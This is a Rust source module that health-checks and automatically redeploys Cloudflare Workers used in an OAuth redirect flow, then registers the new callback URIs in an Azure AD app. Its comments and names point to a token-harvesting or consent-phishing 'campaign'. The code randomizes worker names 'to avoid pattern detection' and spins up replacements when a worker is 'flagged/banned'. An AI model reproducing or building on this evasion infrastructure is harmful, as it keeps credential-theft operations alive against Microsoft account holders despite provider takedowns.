use crate::AppState;
use sqlx::SqlitePool;
use std::env;

/// Create the worker_config table if it doesn't exist.
/// Stores the active worker name and its health status so that
/// generate_oauth_link always uses a live worker.
pub async fn ensure_worker_config_table(pool: &SqlitePool) {
    let _ = sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS worker_config (
            id INTEGER PRIMARY KEY CHECK (id = 1),
            active_worker_name TEXT NOT NULL,
            workers_subdomain TEXT NOT NULL,
            worker_url TEXT NOT NULL,
            redirect_uri TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'unknown',
            last_checked_at TEXT,
            consecutive_failures INTEGER NOT NULL DEFAULT 0,
            created_at TEXT NOT NULL,
            updated_at TEXT NOT NULL
        )
        "#
    ).execute(pool).await;

    // Initialize from env vars if row doesn't exist yet
    let exists: Option<(i64,)> = sqlx::query_as("SELECT id FROM worker_config WHERE id = 1")
        .fetch_optional(pool)
        .await
        .unwrap_or(None);

    if exists.is_none() {
        let worker_name = env::var("CF_WORKER_NAME")
            .unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string());
        let subdomain = env::var("CF_WORKERS_SUBDOMAIN")
            .unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());
        let worker_url = format!("https://{}.{}", worker_name, subdomain);
        let redirect_uri = format!("{}/oauth/callback", worker_url);
        let now = chrono::Utc::now().to_rfc3339();

        let _ = sqlx::query(
            "INSERT INTO worker_config (id, active_worker_name, workers_subdomain, worker_url, redirect_uri, status, consecutive_failures, created_at, updated_at) VALUES (1, ?, ?, ?, ?, 'unknown', 0, ?, ?)"
        )
        .bind(&worker_name)
        .bind(&subdomain)
        .bind(&worker_url)
        .bind(&redirect_uri)
        .bind(&now)
        .bind(&now)
        .execute(pool)
        .await;
    }
}

/// Read the active worker config from the database. Falls back to env vars.
pub async fn get_active_worker(state: &AppState) -> (String, String) {
    let row: Option<(String, String)> = sqlx::query_as(
        "SELECT active_worker_name, workers_subdomain FROM worker_config WHERE id = 1"
    )
    .fetch_optional(&state.pool)
    .await
    .unwrap_or(None);

    match row {
        Some((name, sub)) if !name.is_empty() => (name, sub),
        _ => {
            let name = env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string());
            let sub = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());
            (name, sub)
        }
    }
}

/// Check if a worker is alive by hitting its /status endpoint.
/// Returns true if healthy, false otherwise.
async fn check_worker_health(worker_url: &str) -> bool {
    let status_url = format!("{}/status", worker_url);
    match reqwest::Client::new()
        .get(&status_url)
        .timeout(std::time::Duration::from_secs(10))
        .send()
        .await
    {
        Ok(resp) => resp.status().is_success(),
        Err(_) => false,
    }
}

/// Generate a randomized worker name to avoid pattern detection.
fn generate_worker_name() -> String {
    use rand::Rng;
    let rng = rand::thread_rng();
    let suffix: String = rng
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(8)
        .filter(|c| c.is_ascii_alphanumeric())
        .map(char::from)
        .collect::<String>()
        .to_lowercase();
    format!("simdia-oauth-{}", suffix)
}

/// Deploy a new worker to Cloudflare with the given name.
async fn deploy_new_worker(
    state: &AppState,
    worker_name: &str,
    workers_subdomain: &str,
) -> Result<String, String> {
    let cf_account_id = env::var("CF_ACCOUNT_ID")
        .map_err(|_| "CF_ACCOUNT_ID not set".to_string())?;
    let cf_api_token = env::var("CF_API_TOKEN")
        .map_err(|_| "CF_API_TOKEN not set".to_string())?;

    let main_server = env::var("RAILWAY_PUBLIC_DOMAIN")
        .or_else(|_| env::var("RAILWAY_STATIC_URL"))
        .unwrap_or_else(|_| "api-production-c5ba.up.railway.app".to_string());
    let main_server = if main_server.starts_with("https://") {
        main_server
    } else {
        format!("https://{}", main_server)
    };

    let redirect_uri = format!("https://{}.{}/oauth/callback", worker_name, workers_subdomain);

    // Push the worker script to Cloudflare
    let metadata = serde_json::json!({
        "body_part": "script",
        "bindings": [
            { "type": "plain_text", "name": "MAIN_SERVER", "text": main_server },
            { "type": "plain_text", "name": "CLIENT_ID", "text": state.config.client_id },
            { "type": "plain_text", "name": "REDIRECT_URI", "text": redirect_uri }
        ]
    });

    let cf_url = format!(
        "https://api.cloudflare.com/client/v4/accounts/{}/workers/scripts/{}",
        cf_account_id, worker_name
    );

    let worker_script = crate::WORKER_SCRIPT;

    let form = reqwest::multipart::Form::new()
        .part("metadata", reqwest::multipart::Part::text(metadata.to_string())
            .mime_str("application/json").unwrap())
        .part("script", reqwest::multipart::Part::text(worker_script.to_string())
            .file_name("index.js")
            .mime_str("application/javascript").unwrap());

    let cf_res = state.http_client
        .put(&cf_url)
        .header("Authorization", format!("Bearer {}", cf_api_token))
        .multipart(form)
        .send()
        .await;

    match cf_res {
        Ok(r) if r.status().is_success() => {
            let worker_url = format!("https://{}.{}", worker_name, workers_subdomain);
            eprintln!("[worker-health] Deployed new worker: {} -> {}", worker_name, worker_url);
            Ok(worker_url)
        }
        Ok(r) => {
            let status = r.status();
            let body_text = r.text().await.unwrap_or_default();
            Err(format!("Cloudflare API returned {}: {}", status, body_text))
        }
        Err(e) => Err(format!("Cloudflare API request failed: {}", e)),
    }
}

/// Update the worker_config table with the new active worker.
async fn update_active_worker(
    pool: &SqlitePool,
    worker_name: &str,
    workers_subdomain: &str,
    worker_url: &str,
    redirect_uri: &str,
    status: &str,
) {
    let now = chrono::Utc::now().to_rfc3339();
    let _ = sqlx::query(
        r#"UPDATE worker_config SET
            active_worker_name = ?,
            workers_subdomain = ?,
            worker_url = ?,
            redirect_uri = ?,
            status = ?,
            consecutive_failures = 0,
            updated_at = ?
        WHERE id = 1"#
    )
    .bind(worker_name)
    .bind(workers_subdomain)
    .bind(worker_url)
    .bind(redirect_uri)
    .bind(status)
    .bind(&now)
    .execute(pool)
    .await;
}

/// Main health check + auto-recovery cycle.
/// Called periodically by the scheduler.
pub async fn run_worker_health_check(state: &AppState) {
    ensure_worker_config_table(&state.pool).await;

    // Read current worker config from DB
    let row: Option<(String, String, String)> = sqlx::query_as(
        "SELECT active_worker_name, workers_subdomain, worker_url FROM worker_config WHERE id = 1"
    )
    .fetch_optional(&state.pool)
    .await
    .unwrap_or(None);

    let (worker_name, workers_subdomain, worker_url) = match row {
        Some(r) => r,
        None => return,
    };

    let now = chrono::Utc::now().to_rfc3339();

    // Check health
    let is_healthy = check_worker_health(&worker_url).await;

    if is_healthy {
        // Update status to healthy, reset failure count
        let _ = sqlx::query(
            "UPDATE worker_config SET status = 'healthy', consecutive_failures = 0, last_checked_at = ? WHERE id = 1"
        )
        .bind(&now)
        .execute(&state.pool)
        .await;
        return;
    }

    // Worker is down — increment failure count
    let failures: i64 = sqlx::query_scalar::<_, i64>(
        "SELECT consecutive_failures FROM worker_config WHERE id = 1"
    )
    .fetch_one(&state.pool)
    .await
    .unwrap_or(0);

    let new_failures = failures + 1;
    let _ = sqlx::query(
        "UPDATE worker_config SET status = 'down', consecutive_failures = ?, last_checked_at = ? WHERE id = 1"
    )
    .bind(new_failures)
    .bind(&now)
    .execute(&state.pool)
    .await;

    eprintln!(
        "[worker-health] Worker {} is DOWN (consecutive failures: {})",
        worker_name, new_failures
    );

    // Auto-deploy a new worker after 3 consecutive failures
    if new_failures >= 3 {
        eprintln!("[worker-health] Auto-deploying replacement worker...");

        // Step 1: Try re-deploying to the SAME worker name first.
        // This fixes "down/crashed" workers while keeping old links alive
        // (the worker URL doesn't change, so existing links still work).
        eprintln!("[worker-health] Attempting same-name re-deploy: {}", worker_name);
        match deploy_new_worker(state, &worker_name, &workers_subdomain).await {
            Ok(same_url) => {
                tokio::time::sleep(std::time::Duration::from_secs(2)).await;
                if check_worker_health(&same_url).await {
                    eprintln!("[worker-health] Same-name re-deploy succeeded: {}", worker_name);
                    let redirect_uri = format!("{}/oauth/callback", same_url);
                    update_active_worker(&state.pool, &worker_name, &workers_subdomain, &same_url, &redirect_uri, "healthy").await;
                    return;
                }
                eprintln!("[worker-health] Same-name re-deployed but health check failed. Trying new name.");
            }
            Err(e) => {
                eprintln!("[worker-health] Same-name re-deploy failed: {}. Trying new name.", e);
            }
        }

        // Step 2: If same-name failed (worker is flagged/banned), deploy
        // with a new randomized name. Old links to the dead worker will
        // fail, but new links using /api/campaigns/redirect will work
        // automatically because that endpoint reads from the DB.
        let new_name = generate_worker_name();
        match deploy_new_worker(state, &new_name, &workers_subdomain).await {
            Ok(new_worker_url) => {
                let new_redirect_uri = format!("{}/oauth/callback", new_worker_url);

                // Verify the new worker is actually alive
                tokio::time::sleep(std::time::Duration::from_secs(2)).await;
                if check_worker_health(&new_worker_url).await {
                    eprintln!(
                        "[worker-health] New worker is healthy: {} -> {}",
                        new_name, new_worker_url
                    );

                    update_active_worker(
                        &state.pool,
                        &new_name,
                        &workers_subdomain,
                        &new_worker_url,
                        &new_redirect_uri,
                        "healthy",
                    )
                    .await;

                    // Try to register the new redirect URI in Azure AD
                    // so OAuth flows work with the new worker immediately.
                    let _ = register_redirect_uri_in_azure(state, &new_redirect_uri).await;

                    eprintln!(
                        "[worker-health] Active worker updated to {}. \
                         New OAuth links will use: {}/start",
                        new_name, new_worker_url
                    );
                } else {
                    eprintln!(
                        "[worker-health] New worker deployed but health check failed. \
                         Will retry on next cycle."
                    );
                }
            }
            Err(e) => {
                eprintln!("[worker-health] Failed to deploy replacement worker: {}", e);
            }
        }
    }
}

/// Attempt to register a new redirect URI in Azure AD via Microsoft Graph API.
/// Uses client_credentials flow with the app's client_id and client_secret.
/// Requires the Azure app to have Application.ReadWrite.All permission.
/// If it fails, the redirect URI must be added manually in Azure Portal.
async fn register_redirect_uri_in_azure(
    state: &AppState,
    new_redirect_uri: &str,
) -> Result<(), String> {
    // Step 1: Get an app access token via client_credentials
    let token_resp = state.http_client
        .post("https://login.microsoftonline.com/common/oauth2/v2.0/token")
        .form(&[
            ("client_id", state.config.client_id.as_str()),
            ("client_secret", state.config.client_secret.as_str()),
            ("grant_type", "client_credentials"),
            ("scope", "https://graph.microsoft.com/.default"),
        ])
        .send()
        .await
        .map_err(|e| format!("Token request failed: {}", e))?;

    if !token_resp.status().is_success() {
        let body = token_resp.text().await.unwrap_or_default();
        eprintln!(
            "[worker-health] Cannot get app token for Azure update: {} \
             — add redirect URI manually: {}",
            body, new_redirect_uri
        );
        return Err(format!("Token request failed: {}", body));
    }

    let token_body: serde_json::Value = token_resp.json().await
        .map_err(|e| format!("Failed to parse token: {}", e))?;
    let access_token = token_body.get("access_token")
        .and_then(|v| v.as_str())
        .ok_or("No access_token in response")?;

    // Step 2: Find the application object ID by filtering on appId
    let app_resp = state.http_client
        .get("https://graph.microsoft.com/v1.0/applications")
        .header("Authorization", format!("Bearer {}", access_token))
        .query(&[("$filter", format!("appId eq '{}'", state.config.client_id).as_str())])
        .send()
        .await
        .map_err(|e| format!("Failed to find app: {}", e))?;

    if !app_resp.status().is_success() {
        let body = app_resp.text().await.unwrap_or_default();
        eprintln!(
            "[worker-health] Cannot find app in Azure: {} \
             — add redirect URI manually: {}",
            body, new_redirect_uri
        );
        return Err(format!("Failed to find app: {}", body));
    }

    let app_body: serde_json::Value = app_resp.json().await
        .map_err(|e| format!("Failed to parse app list: {}", e))?;
    let app_obj_id = app_body
        .get("value")
        .and_then(|v| v.as_array())
        .and_then(|arr| arr.first())
        .and_then(|app| app.get("id"))
        .and_then(|v| v.as_str())
        .ok_or("Application not found in Azure AD")?;

    // Step 3: Read current redirect URIs
    let current_uris = app_body
        .get("value")
        .and_then(|v| v.as_array())
        .and_then(|arr| arr.first())
        .and_then(|app| app.get("web"))
        .and_then(|web| web.get("redirectUris"))
        .and_then(|u| u.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|u| u.as_str().map(|s| s.to_string()))
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();

    // Add the new redirect URI if not already present
    if current_uris.iter().any(|u| u == new_redirect_uri) {
        eprintln!("[worker-health] Redirect URI already registered in Azure");
        return Ok(());
    }

    let mut all_uris = current_uris.clone();
    all_uris.push(new_redirect_uri.to_string());

    // Step 4: PATCH the application with updated redirect URIs
    let patch_body = serde_json::json!({
        "web": {
            "redirectUris": all_uris
        }
    });

    let patch_resp = state.http_client
        .patch(&format!("https://graph.microsoft.com/v1.0/applications/{}", app_obj_id))
        .header("Authorization", format!("Bearer {}", access_token))
        .json(&patch_body)
        .send()
        .await
        .map_err(|e| format!("Failed to update app: {}", e))?;

    if patch_resp.status().is_success() {
        eprintln!(
            "[worker-health] Successfully registered new redirect URI in Azure: {}",
            new_redirect_uri
        );
        Ok(())
    } else {
        let body = patch_resp.text().await.unwrap_or_default();
        eprintln!(
            "[worker-health] Failed to register redirect URI in Azure: {} \
             — add manually: {}",
            body, new_redirect_uri
        );
        Err(format!("Failed to update app: {}", body))
    }
}
